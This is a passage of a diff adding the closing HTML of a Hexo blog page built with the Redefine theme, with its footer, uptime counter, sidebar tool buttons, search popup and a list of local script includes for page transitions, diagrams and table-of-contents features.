+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+    
+        
+<script src="/js/build/libs/mermaid.min.js"></script>
+
+    
+    
+<script src="/js/build/plugins/mermaid.js"></script>
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+    
+<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>
+
+
+	
+</body>
+
+</html>
